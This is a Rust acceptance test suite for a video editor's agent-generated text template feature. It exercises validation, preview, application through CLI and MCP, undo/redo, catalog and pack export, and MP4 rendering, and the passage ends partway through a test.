//! Phase 35 Acceptance Test Suite
//! Agent Template Generation & Refinement via CLI/MCP
//! Governed by Plans/plan_phase35_agent_template_generation.md, ADR-005, and ADR-001 v3.

use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use tinixcut_lib::modules::automation::mcp::TinixCutMcpServer;
use tinixcut_lib::modules::automation::AutomationAdapter;
use tinixcut_lib::modules::domain::template::{
    ResponsivePolicy, TemplateLayer, TemplateLayerKind, TemplateParameterBinding,
    TemplateParameterDefinition, TemplateParameterType, TemplateParameterValue,
    TemplatePropertyPath, TemplateResourceManifest, TemplateShapeKind, TemplateShapeLayerData,
    TemplateTextLayerData,
};
use tinixcut_lib::modules::domain::text::{
    AnimationTransform, AnimationUnit, DurationConflictPolicy, FontReference, FontStyle,
    GradientKind, GradientSpace, GradientStop, LoopMode, StaggerOrder, TextAnimation,
    TextAnimationSegment, TextFill, TextLayout, TextRichStyle, TextShadow, TextStroke,
};
use tinixcut_lib::modules::domain::time::{FrameRate, RationalTime, TimeRange};
use tinixcut_lib::modules::domain::{
    ItemKind, KeyframeEasing, Project, TextAnchor, TextStyle, TimelineItem, Track, TrackKind,
    Transform,
};
use tinixcut_lib::modules::export::{ExportEngine, ExportProfile};
use tinixcut_lib::modules::persistence::{load_project, save_project_atomic};
use tinixcut_lib::modules::templates::agent::{
    AgentTemplateError, AgentTemplateService, TemplateDraft, TemplateDraftProvenance,
    TemplateDraftSlot,
};
use tinixcut_lib::modules::templates::catalog::TemplateCatalog;
use tinixcut_lib::modules::templates::pack::{TemplatePackManifest, TemplatePackService};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader as TokioBufReader};

static NEXT_REQ_ID: AtomicU64 = AtomicU64::new(1);

fn next_id() -> u64 {
    NEXT_REQ_ID.fetch_add(1, Ordering::SeqCst)
}

struct TempDirGuard {
    path: PathBuf,
}

impl Drop for TempDirGuard {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

impl AsRef<Path> for TempDirGuard {
    fn as_ref(&self) -> &Path {
        &self.path
    }
}

fn test_dir(name: &str) -> TempDirGuard {
    let dir = std::env::temp_dir().join(format!("tinixcut_p35_{}_{}", name, next_id()));
    if dir.exists() {
        let _ = fs::remove_dir_all(&dir);
    }
    fs::create_dir_all(&dir).expect("Failed to create test directory");
    TempDirGuard { path: dir }
}

fn create_base_project(name: &str) -> Project {
    let mut project = Project::new(name.to_string());
    project.settings.width = 1920;
    project.settings.height = 1080;
    project.settings.frame_rate = FrameRate::FPS_30;
    project
        .tracks
        .push(Track::new("Video Track 1".to_string(), TrackKind::Video));
    project
}

fn create_text_item(id: &str, text: &str, duration_frames: i64) -> TimelineItem {
    let fps = FrameRate::FPS_30;
    let mut item = TimelineItem::new(
        None,
        format!("Clip_{id}"),
        ItemKind::Text,
        TimeRange::new(
            RationalTime::zero(fps),
            RationalTime::new(duration_frames, fps),
        ),
        TimeRange::new(
            RationalTime::zero(fps),
            RationalTime::new(duration_frames, fps),
        ),
    )
    .expect("Valid timeline item");
    item.item_id = id.to_string();
    item.text_content = Some(text.to_string());
    item
}

fn create_vietnamese_title_draft_v1() -> TemplateDraft {
    let fps = FrameRate::FPS_30;

    let rich_style = TextRichStyle {
        fill: TextFill::Gradient {
            gradient_kind: GradientKind::Linear,
            angle_deg: 45.0,
            radius: None,
            space: GradientSpace::All,
            stops: vec![
                GradientStop {
                    offset: 0.0,
                    color: "#FFD700".to_string(),
                },
                GradientStop {
                    offset: 1.0,
                    color: "#FF4500".to_string(),
                },
            ],
        },
        font: Some(FontReference {
            family: "Roboto".to_string(),
            weight: 700,
            style: FontStyle::Normal,
            asset_id: None,
        }),
        font_size: Some(80.0),
        layout: TextLayout::default(),
        strokes: vec![TextStroke {
            color: "#8B0000".to_string(),
            width: 4.0,
            align: tinixcut_lib::modules::domain::text::StrokeAlign::Outside,
        }],
        shadows: vec![TextShadow {
            color: "#000000AA".to_string(),
            offset_x: 6.0,
            offset_y: 6.0,
            blur: 8.0,
        }],
        background: None,
        spans: Vec::new(),
    };

    let animation = TextAnimation {
        unit: AnimationUnit::Grapheme,
        order: StaggerOrder::Forward,
        seed: None,
        pivot_x: 0.5,
        pivot_y: 0.5,
        in_anim: Some(TextAnimationSegment {
            duration: RationalTime::new(18, fps),
            easing: KeyframeEasing::EaseOut,
            stagger_ratio: 0.2,
            from: AnimationTransform {
                translate_x: 0.0,
                translate_y: 40.0,
                scale_x: 0.8,
                scale_y: 0.8,
                rotation: 0.0,
                opacity: 0.0,
            },
            to: AnimationTransform::default(),
        }),
        loop_anim: None,
        out_anim: Some(TextAnimationSegment {
            duration: RationalTime::new(12, fps),
            easing: KeyframeEasing::EaseIn,
            stagger_ratio: 0.2,
            from: AnimationTransform::default(),
            to: AnimationTransform {
                translate_x: 0.0,
                translate_y: -30.0,
                scale_x: 1.0,
                scale_y: 1.0,
                rotation: 0.0,
                opacity: 0.0,
            },
        }),
        loop_mode: LoopMode::None,
        conflict_policy: DurationConflictPolicy::ProportionalScale,
        phase_origin: None,
        phase_end: None,
    };

    let primary_layer = TemplateLayer {
        layer_id: "title_layer".to_string(),
        name: "Main Title".to_string(),
        z_index: 1,
        visible: true,
        opacity: 1.0,
        transform: Transform::default(),
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: Some(animation.clone()),
        kind: TemplateLayerKind::Text(TemplateTextLayerData {
            is_primary: true,
            slot_key: Some("title".to_string()),
            text_content: Some("Hào Khí Việt Nam".to_string()),
            text_style: Some(TextStyle {
                font_family: "Roboto".to_string(),
                font_size: 80.0,
                font_color: "#FFD700".to_string(),
                ..Default::default()
            }),
            text_rich: Some(rich_style),
            text_animation: Some(animation),
        }),
    };

    let dec_shape_layer = TemplateLayer {
        layer_id: "accent_bar".to_string(),
        name: "Accent Underline".to_string(),
        z_index: 0,
        visible: true,
        opacity: 0.85,
        transform: Transform {
            position_x: 0.0,
            position_y: 70.0,
            scale_x: 1.0,
            scale_y: 1.0,
            rotation: 0.0,
        },
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: None,
        kind: TemplateLayerKind::Shape(TemplateShapeLayerData {
            shape_kind: TemplateShapeKind::RoundedRectangle,
            width: 400.0,
            height: 8.0,
            fill_color: Some("#FFD700".to_string()),
            stroke_color: None,
            stroke_width: 0.0,
            corner_radius: 4.0,
        }),
    };

    TemplateDraft {
        draft_id: "draft_vn_title_v1".to_string(),
        schema_version: 1,
        template_id: "vn_hao_khi".to_string(),
        template_version: 1,
        name: "Hào Khí Việt Nam Title".to_string(),
        category: "Title".to_string(),
        description: "Vietnamese patriotic animated title with gold-red gradient, outer stroke and grapheme animation".to_string(),
        tags: vec!["vietnamese".to_string(), "gradient".to_string(), "animated".to_string(), "title".to_string()],
        slots: vec![TemplateDraftSlot {
            slot_key: "title".to_string(),
            name: "Main Title Text".to_string(),
            slot_type: "text".to_string(),
            description: Some("Headline text in Vietnamese".to_string()),
            required: true,
        }],
        parameters: vec![
            TemplateParameterDefinition {
                key: "accent_color".to_string(),
                name: "Accent Bar Color".to_string(),
                param_type: TemplateParameterType::Color,
                default_value: TemplateParameterValue::Color("#FFD700".to_string()),
                description: Some("Color of bottom underline".to_string()),
            },
            TemplateParameterDefinition {
                key: "bar_width".to_string(),
                name: "Accent Bar Width".to_string(),
                param_type: TemplateParameterType::Number { min: 50.0, max: 1200.0, step: 10.0 },
                default_value: TemplateParameterValue::Number(400.0),
                description: Some("Width of accent bar".to_string()),
            },
        ],
        bindings: vec![
            TemplateParameterBinding {
                parameter_key: "accent_color".to_string(),
                target_layer_id: "accent_bar".to_string(),
                target_property: TemplatePropertyPath::FillColor,
            },
            TemplateParameterBinding {
                parameter_key: "bar_width".to_string(),
                target_layer_id: "accent_bar".to_string(),
                target_property: TemplatePropertyPath::Width,
            },
        ],
        layers: vec![dec_shape_layer, primary_layer],
        resources: TemplateResourceManifest::default(),
        responsive_policy: ResponsivePolicy::default(),
        default_duration: RationalTime::new(90, fps),
        provenance: TemplateDraftProvenance {
            author_type: "agent".to_string(),
            agent_id: Some("tinix-creative-agent".to_string()),
            agent_version: Some("1.2.0".to_string()),
            prompt: Some("Create an epic Vietnamese patriotic title with gradient fill and character animations".to_string()),
            reference_summary: Some("Reference style: Golden red festival title".to_string()),
            parent_draft_id: None,
            iteration: 1,
            unsupported_approximations: Vec::new(),
            required_missing_resources: Vec::new(),
            created_at: chrono::Utc::now().to_rfc3339(),
        },
        user_overrides: Vec::new(),
    }
}

fn create_vietnamese_title_draft_v2_refined(parent: &TemplateDraft) -> TemplateDraft {
    let mut refined = parent.clone();
    refined.draft_id = "draft_vn_title_v2_refined".to_string();
    refined.provenance.parent_draft_id = Some(parent.draft_id.clone());
    refined.provenance.iteration = 2;
    refined.provenance.prompt = Some("Less shadow blur and cooler cyan-blue gradient".to_string());

    // Refine primary layer: reduce shadow blur from 8 to 4, update gradient to cyan-blue
    if let Some(primary) = refined
        .layers
        .iter_mut()
        .find(|l| l.layer_id == "title_layer")
    {
        if let TemplateLayerKind::Text(ref mut t) = primary.kind {
            if let Some(ref mut rich) = t.text_rich {
                rich.shadows = vec![TextShadow {
                    color: "#00000088".to_string(),
                    offset_x: 3.0,
                    offset_y: 3.0,
                    blur: 3.0, // Reduced shadow
                }];
                rich.fill = TextFill::Gradient {
                    gradient_kind: GradientKind::Linear,
                    angle_deg: 90.0,
                    radius: None,
                    space: GradientSpace::All,
                    stops: vec![
                        GradientStop {
                            offset: 0.0,
                            color: "#00FFFF".to_string(),
                        },
                        GradientStop {
                            offset: 1.0,
                            color: "#0077FF".to_string(),
                        },
                    ],
                };
            }
        }
    }

    // Refine accent bar binding default
    if let Some(p) = refined
        .parameters
        .iter_mut()
        .find(|p| p.key == "accent_color")
    {
        p.default_value = TemplateParameterValue::Color("#00FFFF".to_string());
    }

    refined
}

fn create_multilayer_quote_card_draft() -> TemplateDraft {
    let fps = FrameRate::FPS_30;

    let card_bg = TemplateLayer {
        layer_id: "card_bg".to_string(),
        name: "Card Background".to_string(),
        z_index: 0,
        visible: true,
        opacity: 0.95,
        transform: Transform::default(),
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: None,
        kind: TemplateLayerKind::Shape(TemplateShapeLayerData {
            shape_kind: TemplateShapeKind::RoundedRectangle,
            width: 800.0,
            height: 360.0,
            fill_color: Some("#1E1E2E".to_string()),
            stroke_color: Some("#89B4FA".to_string()),
            stroke_width: 3.0,
            corner_radius: 18.0,
        }),
    };

    let quote_text = TemplateLayer {
        layer_id: "quote_text".to_string(),
        name: "Quote Body".to_string(),
        z_index: 1,
        visible: true,
        opacity: 1.0,
        transform: Transform {
            position_x: 0.0,
            position_y: -30.0,
            scale_x: 1.0,
            scale_y: 1.0,
            rotation: 0.0,
        },
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: None,
        kind: TemplateLayerKind::Text(TemplateTextLayerData {
            is_primary: true,
            slot_key: Some("quote".to_string()),
            text_content: Some("Học, học nữa, học mãi".to_string()),
            text_style: Some(TextStyle {
                font_family: "Inter".to_string(),
                font_size: 42.0,
                font_color: "#CDD6F4".to_string(),
                ..Default::default()
            }),
            text_rich: None,
            text_animation: None,
        }),
    };

    let author_text = TemplateLayer {
        layer_id: "author_text".to_string(),
        name: "Author Subtitle".to_string(),
        z_index: 2,
        visible: true,
        opacity: 0.8,
        transform: Transform {
            position_x: 200.0,
            position_y: 80.0,
            scale_x: 1.0,
            scale_y: 1.0,
            rotation: 0.0,
        },
        anchor: TextAnchor::MiddleRight,
        pivot: (1.0, 0.5),
        motion: None,
        kind: TemplateLayerKind::Text(TemplateTextLayerData {
            is_primary: false,
            slot_key: Some("author".to_string()),
            text_content: Some("— V. I. Lênin".to_string()),
            text_style: Some(TextStyle {
                font_family: "Inter".to_string(),
                font_size: 26.0,
                font_color: "#A6ADC8".to_string(),
                ..Default::default()
            }),
            text_rich: None,
            text_animation: None,
        }),
    };

    TemplateDraft {
        draft_id: "draft_quote_card_v1".to_string(),
        schema_version: 1,
        template_id: "quote_card_modern".to_string(),
        template_version: 1,
        name: "Modern Quote Card".to_string(),
        category: "QuoteCard".to_string(),
        description: "Elegant rounded quote card with author attribution".to_string(),
        tags: vec![
            "quote".to_string(),
            "card".to_string(),
            "education".to_string(),
        ],
        slots: vec![
            TemplateDraftSlot {
                slot_key: "quote".to_string(),
                name: "Quote Statement".to_string(),
                slot_type: "text".to_string(),
                description: Some("The main quote text".to_string()),
                required: true,
            },
            TemplateDraftSlot {
                slot_key: "author".to_string(),
                name: "Author Name".to_string(),
                slot_type: "text".to_string(),
                description: Some("Attribution line".to_string()),
                required: false,
            },
        ],
        parameters: vec![TemplateParameterDefinition {
            key: "border_color".to_string(),
            name: "Card Border Color".to_string(),
            param_type: TemplateParameterType::Color,
            default_value: TemplateParameterValue::Color("#89B4FA".to_string()),
            description: None,
        }],
        bindings: vec![TemplateParameterBinding {
            parameter_key: "border_color".to_string(),
            target_layer_id: "card_bg".to_string(),
            target_property: TemplatePropertyPath::StrokeColor,
        }],
        layers: vec![card_bg, quote_text, author_text],
        resources: TemplateResourceManifest::default(),
        responsive_policy: ResponsivePolicy::default(),
        default_duration: RationalTime::new(90, fps),
        provenance: TemplateDraftProvenance {
            author_type: "agent".to_string(),
            agent_id: Some("tinix-quote-bot".to_string()),
            agent_version: Some("2.0.0".to_string()),
            prompt: Some("Create a clean quote card for educational videos".to_string()),
            reference_summary: Some("Inspirational quote card layout".to_string()),
            parent_draft_id: None,
            iteration: 1,
            unsupported_approximations: vec!["CustomFont(Playfair)".to_string()],
            required_missing_resources: vec!["quote_icon_missing.png".to_string()],
            created_at: chrono::Utc::now().to_rfc3339(),
        },
        user_overrides: Vec::new(),
    }
}

struct DuplexMcpClient {
    reader: TokioBufReader<tokio::io::ReadHalf<tokio::io::DuplexStream>>,
    writer: tokio::io::WriteHalf<tokio::io::DuplexStream>,
}

impl DuplexMcpClient {
    async fn new(server: TinixCutMcpServer) -> Self {
        let (client_io, server_io) = tokio::io::duplex(131072);
        tokio::spawn(async move {
            if let Ok(running) = rmcp::serve_server(server, server_io).await {
                let _ = running.waiting().await;
            }
        });
        let (read_half, write_half) = tokio::io::split(client_io);
        Self {
            reader: TokioBufReader::new(read_half),
            writer: write_half,
        }
    }

    async fn send_request(
        &mut self,
        method: &str,
        mut params: serde_json::Value,
    ) -> serde_json::Value {
        let id = next_id();
        if let Some(map) = params.as_object_mut() {
            if !map.contains_key("_meta") {
                map.insert(
                    "_meta".to_string(),
                    serde_json::json!({
                        "io.modelcontextprotocol/protocolVersion": "2026-07-28",
                        "io.modelcontextprotocol/clientCapabilities": {},
                        "io.modelcontextprotocol/clientInfo": {
                            "name": "phase35-test-client",
                            "version": "1.0.0"
                        }
                    }),
                );
            }
        }

        let req = serde_json::json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": method,
            "params": params,
        });

        let mut line = serde_json::to_string(&req).unwrap();
        line.push('\n');
        self.writer.write_all(line.as_bytes()).await.unwrap();
        self.writer.flush().await.unwrap();

        let mut resp_line = String::new();
        tokio::time::timeout(
            std::time::Duration::from_secs(15),
            self.reader.read_line(&mut resp_line),
        )
        .await
        .expect("MCP request timed out after 15s")
        .expect("Failed to read from MCP stream");
        if resp_line.trim().is_empty() {
            panic!("MCP server closed connection (EOF) without response");
        }
        serde_json::from_str(&resp_line).expect("Valid JSON-RPC response frame")
    }

    async fn write_message(&mut self, val: serde_json::Value) {
        let mut line = serde_json::to_string(&val).unwrap();
        line.push('\n');
        self.writer.write_all(line.as_bytes()).await.unwrap();
        self.writer.flush().await.unwrap();
    }

    async fn send_notification(&mut self, method: &str, params: serde_json::Value) {
        let notif = serde_json::json!({
            "jsonrpc": "2.0",
            "method": method,
            "params": params,
        });
        self.write_message(notif).await;
    }

    async fn call_tool(&mut self, tool_name: &str, args: serde_json::Value) -> serde_json::Value {
        self.send_request(
            "tools/call",
            serde_json::json!({
                "name": tool_name,
                "arguments": args,
            }),
        )
        .await
    }
}

// ============================================================================
// Acceptance Tests (Phase 35)
// ============================================================================

#[tokio::test]
async fn test_p35_ac01_capabilities_and_schema_surface_cli_and_mcp() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // 1. Query MCP tinixcut_capabilities
    let mcp_res = client
        .call_tool("tinixcut_capabilities", serde_json::json!({}))
        .await;
    let structured = &mcp_res["result"]["structuredContent"];
    assert!(
        structured.is_object(),
        "MCP capabilities must return structured content"
    );

    let template_caps = &structured["templateCapabilities"];
    assert!(
        template_caps.is_object(),
        "Capabilities must expose templateCapabilities"
    );
    assert_eq!(template_caps["schemaVersion"], 1);
    assert_eq!(template_caps["maxLayers"], 16);
    assert_eq!(template_caps["maxTextSlots"], 8);
    assert_eq!(template_caps["maxGraphemesPerSlot"], 512);
    assert_eq!(template_caps["maxRepairIterations"], 5);

    let supported_layers = template_caps["supportedLayerTypes"].as_array().unwrap();
    assert!(supported_layers.contains(&serde_json::json!("Text")));
    assert!(supported_layers.contains(&serde_json::json!("Shape")));
    assert!(supported_layers.contains(&serde_json::json!("Image")));

    let draft_schema = &template_caps["draftJsonSchema"];
    assert_eq!(draft_schema["title"], "TinixCutTemplateDraft");
    assert_eq!(draft_schema["type"], "object");

    // 2. Query CLI template capabilities and schema
    let cli_caps_str =
        AutomationAdapter::handle_cli(&["template".to_string(), "capabilities".to_string()])
            .expect("CLI template capabilities must succeed");
    let cli_caps: serde_json::Value = serde_json::from_str(&cli_caps_str).unwrap();
    assert_eq!(cli_caps["maxLayers"], 16);
    assert_eq!(cli_caps["maxRepairIterations"], 5);

    let cli_schema_str =
        AutomationAdapter::handle_cli(&["template".to_string(), "schema".to_string()])
            .expect("CLI template schema must succeed");
    let cli_schema: serde_json::Value = serde_json::from_str(&cli_schema_str).unwrap();
    assert_eq!(cli_schema["title"], "TinixCutTemplateDraft");
}

#[tokio::test]
async fn test_p35_ac02_vietnamese_title_gradient_stroke_shadow_motion_workflow() {
    let temp = test_dir("ac02_vietnamese");
    let project_path = temp.as_ref().join("project.tcproj");
    let mut base_proj = create_base_project("VietnameseTitleShowcase");
    let item = create_text_item("title_item_1", "Initial Plain Text", 90);
    base_proj.tracks[0].items.push(item);
    save_project_atomic(&base_proj, &project_path).expect("Save base project");

    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // 1. Create and validate Draft v1 (Vietnamese patriotic title with gradient + stroke + shadow)
    let draft_v1 = create_vietnamese_title_draft_v1();
    let val_res = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": draft_v1 }),
        )
        .await;
    let val_report = &val_res["result"]["structuredContent"];
    assert_eq!(val_report["valid"], true, "Draft v1 must validate cleanly");
    assert_eq!(val_report["issues"].as_array().unwrap().len(), 0);

    // 2. Preview Draft v1 frame at t = 1.0s
    let preview_path = temp.as_ref().join("preview_v1.png");
    let prev_res = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft_v1,
                "timeSeconds": 1.0,
                "outputPath": preview_path.to_string_lossy().to_string(),
            }),
        )
        .await;
    let prev_report = &prev_res["result"]["structuredContent"];
    assert_eq!(prev_report["hasVisibleContent"], true);
    assert!(prev_report["nonZeroPixels"].as_u64().unwrap() > 200);
    assert!(preview_path.exists(), "Preview PNG must be written to disk");

    // 3. Refine: produce Candidate Draft v2 ("ít bóng hơn", updated gradient, iteration 2)
    let draft_v2 = create_vietnamese_title_draft_v2_refined(&draft_v1);
    assert_eq!(draft_v2.provenance.iteration, 2);
    assert_eq!(
        draft_v2.provenance.parent_draft_id,
        Some("draft_vn_title_v1".to_string())
    );

    let val_res_v2 = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": draft_v2 }),
        )
        .await;
    assert_eq!(val_res_v2["result"]["structuredContent"]["valid"], true);

    // 4. Apply Draft v2 to the project text item via MCP
    let apply_res = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": project_path.to_string_lossy().to_string(),
                "itemId": "title_item_1",
                "draft": draft_v2,
                "clientId": "test_agent_mcp",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_p35_ac02_apply",
                "baseRevision": 0,
            }),
        )
        .await;
    let apply_receipt = &apply_res["result"]["structuredContent"];
    assert_eq!(apply_receipt["templateId"], "vn_hao_khi");
    assert_eq!(apply_receipt["revision"], 1);

    // Verify on-disk project mutation
    let reloaded = load_project(&project_path).expect("Reload mutated project");
    assert_eq!(reloaded.revision, 1);
    let target_item = &reloaded.tracks[0].items[0];
    assert!(target_item.template_instance.is_some());
    let inst = target_item.template_instance.as_ref().unwrap();
    assert_eq!(inst.template_id, "vn_hao_khi");
    assert_eq!(inst.layers.len(), 2);

    // Verify undo/redo restores pre-template state and re-applies cleanly
    let mut history = tinixcut_lib::modules::history::HistoryManager::new(20);
    history.record_edit(tinixcut_lib::modules::history::HistoryEntry {
        description: "Apply Vietnamese Title Template".to_string(),
        transaction_id: Some("tx_p35_ac02_apply".to_string()),
        prior_snapshot: base_proj.clone(),
        resulting_snapshot: reloaded.clone(),
    });
    assert!(history.can_undo());
    let mut undone_proj = reloaded.clone();
    let undo_desc = history.undo(&mut undone_proj);
    assert_eq!(
        undo_desc.as_deref(),
        Some("Apply Vietnamese Title Template")
    );
    assert_eq!(undone_proj.revision, 0);
    assert!(undone_proj.tracks[0].items[0].template_instance.is_none());

    assert!(history.can_redo());
    let mut redone_proj = undone_proj.clone();
    let redo_desc = history.redo(&mut redone_proj);
    assert_eq!(
        redo_desc.as_deref(),
        Some("Apply Vietnamese Title Template")
    );
    assert_eq!(redone_proj.revision, 1);
    assert_eq!(
        redone_proj.tracks[0].items[0]
            .template_instance
            .as_ref()
            .unwrap()
            .template_id,
        "vn_hao_khi"
    );

    // 5. Save definition to catalog
    let catalog_dir = temp.as_ref().join("catalog");
    let save_res = client
        .call_tool(
            "tinixcut_template_save",
            serde_json::json!({
                "draft": draft_v2,
                "catalogDir": catalog_dir.to_string_lossy().to_string(),
                "overwrite": true,
            }),
        )
        .await;
    let save_receipt = &save_res["result"]["structuredContent"];
    assert_eq!(save_receipt["templateId"], "vn_hao_khi");
    assert_eq!(save_receipt["version"], 1);

    // 6. Export portable pack and reopen in fresh catalog
    let pack_path = temp.as_ref().join("vn_hao_khi_pack.tinixtpl");
    let catalog = TemplateCatalog::new(catalog_dir);
    let pack_manifest = TemplatePackManifest {
        pack_id: "pack_vn_title".to_string(),
        pack_version: 1,
        name: "Vietnamese Title Pack".to_string(),
        author: Some("Agent".to_string()),
        description: Some("VN Animated Title Pack".to_string()),
        template_ids: vec!["vn_hao_khi".to_string()],
        created_at: chrono::Utc::now().to_rfc3339(),
    };
    let def = catalog
        .get("vn_hao_khi", 1)
        .expect("Get definition from catalog");
    let resources_map = HashMap::new();
    TemplatePackService::export_pack(&pack_manifest, &[def], &resources_map, &pack_path)
        .expect("Pack export must succeed");
    assert!(pack_path.exists());

    let fresh_catalog_dir = temp.as_ref().join("fresh_catalog");
    let fresh_catalog = TemplateCatalog::new(fresh_catalog_dir);
    fresh_catalog.ensure_dirs().unwrap();
    let import_manifest = TemplatePackService::import_pack(&pack_path, &fresh_catalog)
        .expect("Pack import into fresh catalog must succeed");
    assert_eq!(import_manifest.pack_id, "pack_vn_title");
    assert!(fresh_catalog.get("vn_hao_khi", 1).is_some());

    // 7. Render and Export project snapshot to MP4: renders without agent/model
    let output_mp4 = temp.as_ref().join("export_vn_title.mp4");
    let report =
        ExportEngine::render_snapshot(&reloaded, &output_mp4, &ExportProfile::default(), None)
            .expect("Snapshot export must succeed");
    assert!(report.file_size_bytes > 0);
    assert!(output_mp4.exists());
    assert!(fs::metadata(&output_mp4).unwrap().len() > 0);
}

#[tokio::test]
async fn test_p35_ac03_multilayer_sticker_quote_card_missing_resources_and_approximations() {
    let temp = test_dir("ac03_quotecard");
    let project_path = temp.as_ref().join("project_quote.tcproj");
    let mut base_proj = create_base_project("QuoteProject");
    let item = create_text_item("quote_item_1", "Original Quote", 90);
    base_proj.tracks[0].items.push(item);
    save_project_atomic(&base_proj, &project_path).expect("Save base project");

    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    let quote_draft = create_multilayer_quote_card_draft();

    // 1. Validate: should report missing resource & unsupported font approximation as warnings, valid = true
    let val_res = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": quote_draft }),
        )
        .await;
    let report = &val_res["result"]["structuredContent"];
    assert_eq!(
        report["valid"], true,
        "Warnings alone do not invalidate the draft"
    );

    let missing = report["missingResources"].as_array().unwrap();
    assert!(missing.contains(&serde_json::json!("quote_icon_missing.png")));

    let unsupp = report["unsupportedOptions"].as_array().unwrap();
    assert!(unsupp.contains(&serde_json::json!("CustomFont(Playfair)")));

    // 2. Preview frame through shared compositor: must render with fallback primitives
    let preview_path = temp.as_ref().join("quote_preview.png");
    let prev_res = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": quote_draft,
                "timeSeconds": 1.0,
                "outputPath": preview_path.to_string_lossy().to_string(),
            }),
        )
        .await;
    let prev_report = &prev_res["result"]["structuredContent"];
    assert_eq!(prev_report["hasVisibleContent"], true);
    assert!(prev_report["nonZeroPixels"].as_u64().unwrap() > 100);

    // 3. Apply via CLI and verify durable project persistence
    let draft_file = temp.as_ref().join("quote_draft.json");
    fs::write(
        &draft_file,
        serde_json::to_string_pretty(&quote_draft).unwrap(),
    )
    .unwrap();

    let cli_output = AutomationAdapter::handle_cli(&[
        "template".to_string(),
        "apply".to_string(),
        project_path.to_string_lossy().to_string(),
        "quote_item_1".to_string(),
        draft_file.to_string_lossy().to_string(),
        "--client-id".to_string(),
        "cli_agent".to_string(),
        "--client-epoch".to_string(),
        "1".to_string(),
        "--sequence".to_string(),
        "1".to_string(),
        "--transaction-id".to_string(),
        "tx_quote_apply_cli".to_string(),
    ])
    .expect("CLI template apply must succeed");

    let cli_receipt: serde_json::Value = serde_json::from_str(&cli_output).unwrap();
    assert_eq!(cli_receipt["templateId"], "quote_card_modern");
    assert_eq!(cli_receipt["revision"], 1);

    let reloaded = load_project(&project_path).expect("Reload project");
    let target = &reloaded.tracks[0].items[0];
    assert_eq!(target.template_instance.as_ref().unwrap().layers.len(), 3);
}

#[tokio::test]
async fn test_p35_ac04_cli_mcp_deterministic_equivalence() {
    let temp = test_dir("ac04_equivalence");
    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "vn_hao_khi_ac04".to_string();
    let draft_path = temp.as_ref().join("draft.json");
    fs::write(&draft_path, serde_json::to_string(&draft).unwrap()).unwrap();

    // Prepare two identical initial projects
    let path_cli = temp.as_ref().join("project_cli.tcproj");
    let path_mcp = temp.as_ref().join("project_mcp.tcproj");

    let mut p1 = create_base_project("EquivalenceP1");
    p1.tracks[0]
        .items
        .push(create_text_item("item_eq", "Same Base Text", 90));
    let p2 = p1.clone();

    save_project_atomic(&p1, &path_cli).unwrap();
    save_project_atomic(&p2, &path_mcp).unwrap();

    // 1. Apply via CLI
    AutomationAdapter::handle_cli(&[
        "template".to_string(),
        "apply".to_string(),
        path_cli.to_string_lossy().to_string(),
        "item_eq".to_string(),
        draft_path.to_string_lossy().to_string(),
        "--client-id".to_string(),
        "equiv_client".to_string(),
        "--client-epoch".to_string(),
        "1".to_string(),
        "--sequence".to_string(),
        "1".to_string(),
        "--transaction-id".to_string(),
        "tx_eq_1".to_string(),
    ])
    .unwrap();

    // 2. Apply via MCP
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;
    let mcp_res = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": path_mcp.to_string_lossy().to_string(),
                "itemId": "item_eq",
                "draft": draft,
                "clientId": "equiv_client",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_eq_1",
                "baseRevision": 0,
            }),
        )
        .await;
    assert!(mcp_res["result"]["structuredContent"].is_object());

    // 3. Verify equivalent canonical project state
    let res_cli = load_project(&path_cli).unwrap();
    let res_mcp = load_project(&path_mcp).unwrap();

    assert_eq!(res_cli.revision, res_mcp.revision);
    assert_eq!(res_cli.tracks[0].items.len(), res_mcp.tracks[0].items.len());

    let inst_cli = res_cli.tracks[0].items[0]
        .template_instance
        .as_ref()
        .unwrap();
    let inst_mcp = res_mcp.tracks[0].items[0]
        .template_instance
        .as_ref()
        .unwrap();
    assert_eq!(inst_cli.template_id, inst_mcp.template_id);
    assert_eq!(inst_cli.layers.len(), inst_mcp.layers.len());

    // 4. Verify preview frame renders identically via CLI and MCP adapters
    let preview_cli_path = temp.as_ref().join("preview_cli.png");
    AutomationAdapter::handle_cli(&[
        "template".to_string(),
        "preview".to_string(),
        draft_path.to_string_lossy().to_string(),
        preview_cli_path.to_string_lossy().to_string(),
        "--time".to_string(),
        "1.0".to_string(),
        "--width".to_string(),
        "640".to_string(),
        "--height".to_string(),
        "360".to_string(),
    ])
    .expect("CLI template preview must succeed");
    assert!(preview_cli_path.exists());
    let bytes_cli = fs::read(&preview_cli_path).expect("Read CLI preview png");

    let preview_mcp_path = temp.as_ref().join("preview_mcp.png");
    let mcp_prev_res = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft,
                "timeSeconds": 1.0,
                "outputPath": preview_mcp_path.to_string_lossy().to_string(),
                "width": 640,
                "height": 360,
            }),
        )
        .await;
    let mcp_prev_report = &mcp_prev_res["result"]["structuredContent"];
    assert_eq!(mcp_prev_report["hasVisibleContent"], true);
    assert!(preview_mcp_path.exists());
